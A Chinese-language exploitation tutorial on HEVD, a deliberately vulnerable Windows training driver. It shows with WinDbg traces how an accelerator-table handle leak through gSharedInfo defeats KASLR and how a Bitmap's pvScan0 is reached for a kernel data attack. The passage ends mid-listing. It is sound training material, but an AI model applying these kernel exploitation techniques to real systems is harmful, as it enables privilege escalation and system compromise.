# 【技术分享】HEVD内核漏洞训练——陪Windows玩儿
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
作者：[k0shl](http://bobao.360.cn/member/contribute?uid=1353169030)
预估稿费：600RMB
投稿方式：发送邮件至[linwei#360.cn](mailto:PI:EMAIL)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
**前言**
前段时间在博客写了一篇关于HEVD内核漏洞利用训练的一篇文章，感觉当时做HEVD收获很大，非常推荐这个训练，这是HackSys Team做的一个Kernel
Driver，里面包含了大量的常见漏洞，而且漏洞原理都非常简单，考验的就是各种各样的利用方法，推荐在Win10下尝试，有各种各样经典的利用方法，比如gsharedInfo，GdiSharedHandleTable，NtAllocateVirtualMemory，替换token的shellcode等等。
对这个训练的研究学习会对内核漏洞的原理，利用方式，Windows下很多常见的数据结构有一个初步的了解，从此打开Ring0的大门。
HEVD项目地址：
对于内核漏洞入门，我推荐的入门方式就是HEVD -> CVE-2014-4113 ->
MS15-061，第一个是训练，后两个是实际环境中的漏洞。感觉在Ring0实在是太有意思了（不断被吊打，不断爬起来）！
HEVD：
CVE-2014-4113：
Windows在高版本中采取了越来越多的保护措施来防止漏洞利用，这让攻击变得越来越有意思，很多防护限制让很多漏洞利用变得难上加难，在这篇文章中，我将针对HEVD的一个任意内存读写漏洞，利用Cn33liz的一个Exploit来完成攻击并分析整个过程。
这次攻击有一个主角，那就是Bitmap，本文主要分析在最新Win10版本以及Win8下，Bitmap到底有多强大的威力。
在本文中，我将首先简单介绍一下Bitmap，最新Win10的KASLR机制，对Bitmap造成的影响，以及如何利用Accelerator
Table来bypass
KASLR。接下来我将和大家分享如何用SetBitmap和GetBitmap来完成攻击，以及攻击的主角，_SURFOBJ中的一个关键结构pvScan0。然后我将和大家分享Win10中的一些疑点，可能是坑，反正至今仍有一些疑惑在里面，接下来，我将结合我的偶像MJ0011在HITCON上一个关于Win8安全特性的演讲，移步Win8，来看看Bitmap的超级杀伤力，以及这些安全特性的防护机制。文末我将把我在Win10和Win8下实验的源码放出来，这个源码中包含对抗Win10和Win8的防护机制的一些过程，是基于Cn33liz大牛的源码改写。文中所有的测试都是基于我改写的源码完成的，相应的注释都在源码中，改动源码仓促也不够漂亮，望大家海涵。因为多次重新调试，地址有变化，可以结合文字一起研究学习。
**本文所用原源码项目地址：**
关于这个漏洞成因，我不再进行详细的讲解，HackSys
team的Github项目里有详细说明，这个任意写漏洞就是可以向指定地址写进指定值，而没有对写入地址和写入内容的合法性进行检查。测试环境是最新版Win10。
**陪Win10玩儿–CreateBitmap和KASLR**
我之前的那篇HEVD的分享中，是在Windows7下面完成的，在Win7下面，我们拥有很多自由，可以向很多特殊的位置、结构写入shellcode，并且在内核态完成shellcode的执行。但是在Win10中，增加了茫茫多的限制，很多利用变得很困难，shellcode似乎变得不太可行。
而在FuzzySecurity中也提到了data attack，在众多限制下，Bitmap给我们提供了一个极大的便捷，这种攻击手段威力很强，非常有趣。
在Windows10中，我们需要获取Bitmap的内核地址，然后利用Bitmap这种_SURFOBJ结构的一个特殊成员变量来完成攻击，也就是我们后面要提到的pvScan0。
在之前版本的Win10中，可以通过一个特殊的结构GdiSharedHandleTable来获得Bitmap的内核对象地址。这个GdiSharedHandleTable是PEB结构体中的一个结构。而里面存放的内容是一个GDICELL64结构。关于在老版本Win10中利用GdiSharedHandleTable如何来获得Bitmap并进行攻击我不再详述，在文章末尾，我会给出一篇非常棒的技术文章，里面详述了这种攻击方式。
在新版本Win10中，fix了这种方法，GdiSharedHandleTable获得的地址，不再是一个有效的pkernelAddress，也就是说，即使我们通过这种方式和createbitmap的handle获得了一个地址，然而并不是真正的pkernelAddress，当然我们的主角pvScan0也不正确。
    kd> dt @$PEB nt!_PEB GdiSharedHandleTable //
       +0x0f8 GdiSharedHandleTable : 0x00000000`00e00000 Void
    kd> db 0x00000000`00e00000+0x0b69*0x18 L8
    00000000`00e111d8  69 0b c2 ff ff ff ff ff                          i.......
    kd> dd ffffffffffc20b69
    ffffffff`ffc20b69  ???????? ???????? ???????? ????????
    kd> dd ffff9f9683d01000
    ffff9f96`83d01000  270501ac 00000000 00000000 00000000
    ffff9f96`83d01010  00000000 00000000 00000000 00000000
可以看到，在通过GdiSharedHandleTable获得的Bitmap的内核地址是一个为开辟的内核空间和真正的Bitmap内核地址有所区别。这时候，gSharedInfo出现了，这个gSharedInfo是一个非常经典的结构，在很多kernel
exploitation都出现过，它其中包含着内核结构，我们可以通过它获得内核表，然后通过计算偏移得到内核对象地址。
解决这种问题的方法就是用AcceleratorTable加速键表，我之前的内核漏洞调试笔记之二调试的CVE-2015-2546就是用的加速键表，制造一个稳定的内存空洞，连续申请释放内存，直到两次申请释放的AccleratorTable的内核句柄相同，则再申请相同大小的bitmap，这样就能获得GDI对象了，再通过这个对象的phead就是pkernelAddress。
如何获得呢？在这个handleentry里有一个aheList，其中包含了一个phead对象，它就是指向pkerneladdress的。来看一下gSharedInfo的地址，这里我也不知道为什么，感觉可能是Win10很多win32k的结构体不透明化了，看不到tagSharedInfo的结构体，感觉像被隐藏了。
    kd> ?user32!gsharedinfo  //获得gsharedinfo的地址值
    Evaluate expression: 140725741012608 = 00007ffd`43cdc680
获得了gSharedInfo的地址之后，我们可以通过Accelerator
Table的handle，获取到gSharedInfo结构中的aheList对应的内核句柄值。
    kd> dd 7ffd43cdc680  //查看地址值的内容
    00007ffd`43cdc680  01360700 00000000 011e0000 00000000
    kd> dt win32k!tagSHAREDINFO  //由于调试时tagSHAREDINFO不透明，这里只能                                  
    //从网上拷贝一个方便说明
         +0x000 psi                    :  tagSERVERINFO
    +0x008 aheList                :  _HANDLEENTRY
    kd> dq 7ffd43cdc680+0x8 L1 //+0x8位置的HANDLEENTRY就是我们要的表
    00007ffd`43cdc688  00000000`011e0000
这样就能得到句柄实际内核地址的表了，也就是指向GDI对象的表，这里就要计算对应的偏移了，计算方法其实和之前GdiSharedHandleTable很像，那个算对应GDICELL64地址的计算方法是：
GdiSharedHandleTable+(handle & 0xffff)*sizeof(GDICELL64)
这里就用_HANDLETABLE_ENTRY + (Accel & 0xffff)*sizeof（Accel）算出地址，这里Accel的值是：
    kd> r eax
    eax=1700b9
    kd> p
    0033:00007ff6`956112d1 488d1449   lea     rdx,[rcx+rcx*2]//计算handle的值
    kd> p
    0033:00007ff6`956112d5 488bc8          mov     rcx,rax
    kd> r rdx
    rdx=000000000000022b// handle的值为22b
    kd> dd 11e0000+22b*8 L1 // 11e0000是刚才获得的HANDLENTRY，计算出偏移
     // 指向的就是GDI对象
    00000000`011e1158  81be7000 ffffbad3
紧接着调用DestroyAcceleratorTable释放这个加速键表，可以看到对应句柄内核指针的值也被释放了。注意这里申请的Accelerator
Table的大小是700，同样如果制造出一个稳定的hole之后，申请bitmap的大小也是700。
    kd> p
    0033:00007ff6`956112d8 488b5cd500      mov     rbx,qword ptr [rbp+rdx*8]
    kd> p
    0033:00007ff6`956112dd ff15451f0000    call    qword ptr [00007ff6`95613228]
    kd> p
    0033:00007ff6`956112e3 babc020000      mov     edx,2BCh
    kd> dd 11e0000+22b*8// 对应索引的位置GDI对象被释放
    00000000`011e1158  0000042f 00000000
可以看到，对应位置存放的GDI对象也释放掉了，再次通过Create申请Accelerator Table。
    0033:00007ff6`956112eb ff152f1f0000    call    qword ptr [00007ff6`95613220]
    kd> p//返回值eax
    0033:00007ff6`956112f1 0fb7c8          movzx   ecx,ax
    kd> r rax
    rax=00000000001800b9
    kd> p
    0033:00007ff6`956112f4 488d1449        lea     rdx,[rcx+rcx*2]
    kd> p
    0033:00007ff6`956112f8 488bc8          mov     rcx,rax
    kd> r rdx//计算获得handle，和上一次申请的handle值一样
    rdx=000000000000022b
    kd> dd 11e0000+22b*8//查看pkernelAddress
    00000000`011e1158  81be7000 ffffbad3
    kd> dd ffffbad381be7000 l90//对应位置存放的值，+0x0位置就是phead
                                //GdiSharedHandleTable被fix，可以用这个方法
    ffffbad3`81be7000  001800b9 00000000 00000000 00000000
    ffffbad3`81be7010  00000000 00000000 000002bc 00000000
句柄虽然改变但是对应索引位置在shared info handle
entry的值仍然是相同的，这样，再次在相同位置申请bitmap，首先释放，来看下pkernelAddress的值：
    kd> p
    0033:00007ff6`95611311 ff15111f0000    call    qword ptr [00007ff6`95613228]
    kd> p
    0033:00007ff6`95611317 33c9            xor     ecx,ecx
    kd> dd ffffbad381be7000//查看GDI对象的内容也被释放
    ffffbad3`81be7000  ???????? ???????? ???????? ????????
    ffffbad3`81be7010  ???????? ???????? ???????? ????????
    ffffbad3`81be7020  ???????? ???????? ???????? ????????
指向的空间也被释放了，随后通过CreateBitmap申请bitmap，大小同样是700，来占用Accelerator制造的稳定内存空洞。调用CreateBitmap之后占用了内存空洞。这样，我们直接找到ffffbad381be7000这个GDI对象。
    kd> p//调用CreateBitmap创建Bitmap
    0033:00007ff6`95611345 ff15dd1c0000    call    qword ptr [00007ff6`95613028]
    kd> p//创建成功返回
    0033:00007ff6`9561134b 488906          mov     qword ptr [rsi],rax
    kd> dd ffffbad381be7000//查看原来Accelerator Table的内核地址位置的值
    ffffbad3`81be7000  96050bd0 ffffffff 00000000 00000000
可以看到，我们成功获得了Bitmap的pkernelAddress，就是0xffffffff96050bd0，这样，我们就成功在KASLR和fix
GdiSharedHandleTable下，完成了bitmap pkernelAddress的获取。
**  
**
**SetBitmap/GetBtimap和pvScan0**
利用gSharedInfo获取aheList，从而得到Accelerator
Table在gshareInfo中的GDI对象从而获得内核地址，利用Accelerator
Table制造稳定的内存空洞，最后绕过KASLR和获取Bitmap的pkernelAddress的目的就是获得pvScan0这个结构，这个是Bitmap之所以成为data
attack的核心。
这里我要提一下，在调试过程中，我们需要用__asm int 3来下断点，但是在64位下VS不支持内联汇编，因此我们在项目中创建一个.asm文件，实现int
3功能，再将其编译，在项目主文件中用Int_3()来下软中断（详见我的源码），这样我们在SetBitmap下断点，首先命中GDI32!SetBitmapBitsStub：
    kd> p
    GDI32!SetBitmapBitsStub+0x1c:
    0033:00007fff`bd5b44ac 488bd9          mov     rbx,rcx
    kd> p//调用GDI32的IsTextOutAPresent -> IsSetWorldTransformImplPresent函数
    GDI32!SetBitmapBitsStub+0x1f:
    0033:00007fff`bd5b44af e878b50000      call    GDI32!IsTextOutAPresent (00007fff`bd5bfa2c)
随后会到达call IsTextOutAPresent函数调用，这个函数在GDI32的实现是IsSetWorldTransformmImplPresent。
    char IsSetWorldTransformImplPresent()
    {
      char result; // al@2